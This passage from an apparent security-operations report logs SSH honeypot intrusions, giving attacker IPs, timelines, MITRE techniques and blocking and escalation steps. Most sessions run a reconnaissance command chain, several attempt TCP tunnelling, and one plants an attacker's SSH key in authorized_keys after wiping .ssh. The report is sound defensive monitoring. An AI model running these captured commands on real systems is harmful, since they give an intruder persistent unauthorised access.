| `2026-09-01 22:25:41` | `cowrie.client.kex` |
| `2026-09-01 22:25:49` | `cowrie.login.success` |
| `2026-09-01 22:25:51` | `cowrie.session.params` |
| `2026-09-01 22:25:51` | `cowrie.command.input` |
| `2026-09-01 22:25:51` | `cowrie.command.input` |
| `2026-09-01 22:25:51` | `cowrie.command.input` |
| `2026-09-01 22:25:51` | `cowrie.command.input` |
| `2026-09-01 22:25:51` | `cowrie.command.input` |
| `2026-09-01 22:25:51` | `cowrie.command.success` |
| `2026-09-01 22:25:51` | `cowrie.command.input` |
| `2026-09-01 22:25:51` | `cowrie.command.input` |
| `2026-09-01 22:25:51` | `cowrie.command.input` |
| `2026-09-01 22:25:51` | `cowrie.command.input` |
| `2026-09-01 22:25:51` | `cowrie.log.closed` |
| `2026-09-01 22:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14aff1a4ded4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:27 |
| **Last Seen** | 2026-09-01 22:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:27:07` | `cowrie.session.connect` |
| `2026-09-01 22:27:09` | `cowrie.client.version` |
| `2026-09-01 22:27:09` | `cowrie.client.kex` |
| `2026-09-01 22:27:14` | `cowrie.login.success` |
| `2026-09-01 22:27:17` | `cowrie.session.params` |
| `2026-09-01 22:27:17` | `cowrie.command.input` |
| `2026-09-01 22:27:17` | `cowrie.command.input` |
| `2026-09-01 22:27:17` | `cowrie.command.input` |
| `2026-09-01 22:27:17` | `cowrie.command.input` |
| `2026-09-01 22:27:17` | `cowrie.command.input` |
| `2026-09-01 22:27:17` | `cowrie.command.success` |
| `2026-09-01 22:27:17` | `cowrie.command.input` |
| `2026-09-01 22:27:17` | `cowrie.command.input` |
| `2026-09-01 22:27:17` | `cowrie.command.input` |
| `2026-09-01 22:27:17` | `cowrie.command.input` |
| `2026-09-01 22:27:17` | `cowrie.log.closed` |
| `2026-09-01 22:27:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1a9123cd893

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:28 |
| **Last Seen** | 2026-09-01 22:28 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:28:31` | `cowrie.session.connect` |
| `2026-09-01 22:28:33` | `cowrie.client.version` |
| `2026-09-01 22:28:33` | `cowrie.client.kex` |
| `2026-09-01 22:28:39` | `cowrie.login.success` |
| `2026-09-01 22:28:40` | `cowrie.session.params` |
| `2026-09-01 22:28:40` | `cowrie.command.input` |
| `2026-09-01 22:28:41` | `cowrie.command.input` |
| `2026-09-01 22:28:41` | `cowrie.command.input` |
| `2026-09-01 22:28:41` | `cowrie.command.input` |
| `2026-09-01 22:28:41` | `cowrie.command.input` |
| `2026-09-01 22:28:41` | `cowrie.command.success` |
| `2026-09-01 22:28:41` | `cowrie.command.input` |
| `2026-09-01 22:28:41` | `cowrie.command.input` |
| `2026-09-01 22:28:41` | `cowrie.command.input` |
| `2026-09-01 22:28:41` | `cowrie.command.input` |
| `2026-09-01 22:28:41` | `cowrie.log.closed` |
| `2026-09-01 22:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b63ec468990

| Field | Detail |
|---|---|
| **Source IP** | `45.154.244[.]193` |
| **First Seen** | 2026-09-01 22:29 |
| **Last Seen** | 2026-09-01 22:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:29:24` | `cowrie.session.connect` |
| `2026-09-01 22:29:24` | `cowrie.client.version` |
| `2026-09-01 22:29:24` | `cowrie.client.kex` |
| `2026-09-01 22:29:25` | `cowrie.login.success` |
| `2026-09-01 22:29:25` | `cowrie.direct-tcpip.request` |
| `2026-09-01 22:29:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 22:29:25` | `cowrie.direct-tcpip.data` |
| `2026-09-01 22:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.154.244[.]193` to AbuseIPDB if not already reported
- [ ] Block `45.154.244[.]193` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa15703b091b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:29 |
| **Last Seen** | 2026-09-01 22:30 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:29:51` | `cowrie.session.connect` |
| `2026-09-01 22:29:53` | `cowrie.client.version` |
| `2026-09-01 22:29:53` | `cowrie.client.kex` |
| `2026-09-01 22:30:00` | `cowrie.login.success` |
| `2026-09-01 22:30:02` | `cowrie.session.params` |
| `2026-09-01 22:30:02` | `cowrie.command.input` |
| `2026-09-01 22:30:02` | `cowrie.command.input` |
| `2026-09-01 22:30:02` | `cowrie.command.input` |
| `2026-09-01 22:30:02` | `cowrie.command.input` |
| `2026-09-01 22:30:02` | `cowrie.command.input` |
| `2026-09-01 22:30:02` | `cowrie.command.success` |
| `2026-09-01 22:30:02` | `cowrie.command.input` |
| `2026-09-01 22:30:02` | `cowrie.command.input` |
| `2026-09-01 22:30:02` | `cowrie.command.input` |
| `2026-09-01 22:30:02` | `cowrie.command.input` |
| `2026-09-01 22:30:02` | `cowrie.log.closed` |
| `2026-09-01 22:30:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e32ea659855

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 22:30 |
| **Last Seen** | 2026-09-01 22:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:30:43` | `cowrie.session.connect` |
| `2026-09-01 22:30:43` | `cowrie.client.version` |
| `2026-09-01 22:30:43` | `cowrie.client.kex` |
| `2026-09-01 22:30:44` | `cowrie.login.success` |
| `2026-09-01 22:30:44` | `cowrie.direct-tcpip.request` |
| `2026-09-01 22:30:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 22:30:45` | `cowrie.direct-tcpip.data` |
| `2026-09-01 22:30:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f26aa7c76cc8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:31 |
| **Last Seen** | 2026-09-01 22:31 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:31:17` | `cowrie.session.connect` |
| `2026-09-01 22:31:19` | `cowrie.client.version` |
| `2026-09-01 22:31:19` | `cowrie.client.kex` |
| `2026-09-01 22:31:26` | `cowrie.login.success` |
| `2026-09-01 22:31:28` | `cowrie.session.params` |
| `2026-09-01 22:31:28` | `cowrie.command.input` |
| `2026-09-01 22:31:28` | `cowrie.command.input` |
| `2026-09-01 22:31:28` | `cowrie.command.input` |
| `2026-09-01 22:31:28` | `cowrie.command.input` |
| `2026-09-01 22:31:28` | `cowrie.command.input` |
| `2026-09-01 22:31:28` | `cowrie.command.success` |
| `2026-09-01 22:31:28` | `cowrie.command.input` |
| `2026-09-01 22:31:28` | `cowrie.command.input` |
| `2026-09-01 22:31:28` | `cowrie.command.input` |
| `2026-09-01 22:31:28` | `cowrie.command.input` |
| `2026-09-01 22:31:29` | `cowrie.log.closed` |
| `2026-09-01 22:31:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19c16e447f0f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:32 |
| **Last Seen** | 2026-09-01 22:32 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:32:39` | `cowrie.session.connect` |
| `2026-09-01 22:32:41` | `cowrie.client.version` |
| `2026-09-01 22:32:41` | `cowrie.client.kex` |
| `2026-09-01 22:32:46` | `cowrie.login.success` |
| `2026-09-01 22:32:49` | `cowrie.session.params` |
| `2026-09-01 22:32:49` | `cowrie.command.input` |
| `2026-09-01 22:32:49` | `cowrie.command.input` |
| `2026-09-01 22:32:49` | `cowrie.command.input` |
| `2026-09-01 22:32:49` | `cowrie.command.input` |
| `2026-09-01 22:32:49` | `cowrie.command.input` |
| `2026-09-01 22:32:49` | `cowrie.command.success` |
| `2026-09-01 22:32:49` | `cowrie.command.input` |
| `2026-09-01 22:32:49` | `cowrie.command.input` |
| `2026-09-01 22:32:49` | `cowrie.command.input` |
| `2026-09-01 22:32:49` | `cowrie.command.input` |
| `2026-09-01 22:32:49` | `cowrie.log.closed` |
| `2026-09-01 22:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba3e56123144

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:33 |
| **Last Seen** | 2026-09-01 22:34 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:33:56` | `cowrie.session.connect` |
| `2026-09-01 22:33:58` | `cowrie.client.version` |
| `2026-09-01 22:33:58` | `cowrie.client.kex` |
| `2026-09-01 22:34:05` | `cowrie.login.success` |
| `2026-09-01 22:34:07` | `cowrie.session.params` |
| `2026-09-01 22:34:07` | `cowrie.command.input` |
| `2026-09-01 22:34:07` | `cowrie.command.input` |
| `2026-09-01 22:34:07` | `cowrie.command.input` |
| `2026-09-01 22:34:07` | `cowrie.command.input` |
| `2026-09-01 22:34:07` | `cowrie.command.input` |
| `2026-09-01 22:34:07` | `cowrie.command.success` |
| `2026-09-01 22:34:07` | `cowrie.command.input` |
| `2026-09-01 22:34:07` | `cowrie.command.input` |
| `2026-09-01 22:34:07` | `cowrie.command.input` |
| `2026-09-01 22:34:07` | `cowrie.command.input` |
| `2026-09-01 22:34:07` | `cowrie.log.closed` |
| `2026-09-01 22:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d1a8dc87270

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:35 |
| **Last Seen** | 2026-09-01 22:35 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:35:14` | `cowrie.session.connect` |
| `2026-09-01 22:35:16` | `cowrie.client.version` |
| `2026-09-01 22:35:16` | `cowrie.client.kex` |
| `2026-09-01 22:35:22` | `cowrie.login.success` |
| `2026-09-01 22:35:24` | `cowrie.session.params` |
| `2026-09-01 22:35:24` | `cowrie.command.input` |
| `2026-09-01 22:35:24` | `cowrie.command.input` |
| `2026-09-01 22:35:24` | `cowrie.command.input` |
| `2026-09-01 22:35:24` | `cowrie.command.input` |
| `2026-09-01 22:35:24` | `cowrie.command.input` |
| `2026-09-01 22:35:24` | `cowrie.command.success` |
| `2026-09-01 22:35:24` | `cowrie.command.input` |
| `2026-09-01 22:35:24` | `cowrie.command.input` |
| `2026-09-01 22:35:24` | `cowrie.command.input` |
| `2026-09-01 22:35:24` | `cowrie.command.input` |
| `2026-09-01 22:35:24` | `cowrie.log.closed` |
| `2026-09-01 22:35:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86ee3f5f2b02

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 22:35 |
| **Last Seen** | 2026-09-01 22:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:35:53` | `cowrie.session.connect` |
| `2026-09-01 22:35:53` | `cowrie.client.version` |
| `2026-09-01 22:35:53` | `cowrie.client.kex` |
| `2026-09-01 22:35:54` | `cowrie.login.success` |
| `2026-09-01 22:35:54` | `cowrie.direct-tcpip.request` |
| `2026-09-01 22:35:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 22:35:55` | `cowrie.direct-tcpip.data` |
| `2026-09-01 22:35:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-871086489a12

| Field | Detail |
|---|---|
| **Source IP** | `116.228.233[.]93` |
| **First Seen** | 2026-09-01 22:36 |
| **Last Seen** | 2026-09-01 22:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:36:23` | `cowrie.session.connect` |
| `2026-09-01 22:36:23` | `cowrie.client.version` |
| `2026-09-01 22:36:24` | `cowrie.client.kex` |
| `2026-09-01 22:36:25` | `cowrie.login.success` |
| `2026-09-01 22:36:26` | `cowrie.session.params` |
| `2026-09-01 22:36:26` | `cowrie.command.input` |
| `2026-09-01 22:36:26` | `cowrie.command.failed` |
| `2026-09-01 22:36:26` | `cowrie.log.closed` |
| `2026-09-01 22:36:27` | `cowrie.session.params` |
| `2026-09-01 22:36:27` | `cowrie.command.input` |
| `2026-09-01 22:36:27` | `cowrie.session.file_download` |
| `2026-09-01 22:36:27` | `cowrie.log.closed` |
| `2026-09-01 22:36:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.228.233[.]93` to AbuseIPDB if not already reported
- [ ] Block `116.228.233[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c656fe5bf9f

| Field | Detail |
|---|---|
| **Source IP** | `116.228.233[.]93` |
| **First Seen** | 2026-09-01 22:36 |
| **Last Seen** | 2026-09-01 22:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:36:27` | `cowrie.session.connect` |
| `2026-09-01 22:36:27` | `cowrie.client.version` |
| `2026-09-01 22:36:28` | `cowrie.client.kex` |
| `2026-09-01 22:36:28` | `cowrie.login.success` |
| `2026-09-01 22:36:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.228.233[.]93` to AbuseIPDB if not already reported
- [ ] Block `116.228.233[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1b25d48b377

| Field | Detail |
|---|---|
| **Source IP** | `116.228.233[.]93` |
| **First Seen** | 2026-09-01 22:36 |
| **Last Seen** | 2026-09-01 22:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:36:29` | `cowrie.session.connect` |
| `2026-09-01 22:36:29` | `cowrie.client.version` |
| `2026-09-01 22:36:29` | `cowrie.client.kex` |
| `2026-09-01 22:36:30` | `cowrie.login.success` |
| `2026-09-01 22:36:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.228.233[.]93` to AbuseIPDB if not already reported
- [ ] Block `116.228.233[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72992d077bed

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:36 |
| **Last Seen** | 2026-09-01 22:36 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:36:33` | `cowrie.session.connect` |
| `2026-09-01 22:36:35` | `cowrie.client.version` |
| `2026-09-01 22:36:35` | `cowrie.client.kex` |
| `2026-09-01 22:36:42` | `cowrie.login.success` |
| `2026-09-01 22:36:44` | `cowrie.session.params` |
| `2026-09-01 22:36:44` | `cowrie.command.input` |
| `2026-09-01 22:36:44` | `cowrie.command.input` |
| `2026-09-01 22:36:44` | `cowrie.command.input` |
| `2026-09-01 22:36:44` | `cowrie.command.input` |
| `2026-09-01 22:36:44` | `cowrie.command.input` |
| `2026-09-01 22:36:44` | `cowrie.command.success` |
| `2026-09-01 22:36:44` | `cowrie.command.input` |
| `2026-09-01 22:36:44` | `cowrie.command.input` |
| `2026-09-01 22:36:44` | `cowrie.command.input` |
| `2026-09-01 22:36:44` | `cowrie.command.input` |
| `2026-09-01 22:36:44` | `cowrie.log.closed` |
| `2026-09-01 22:36:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-114ca6d6cdc3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:37 |
| **Last Seen** | 2026-09-01 22:38 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
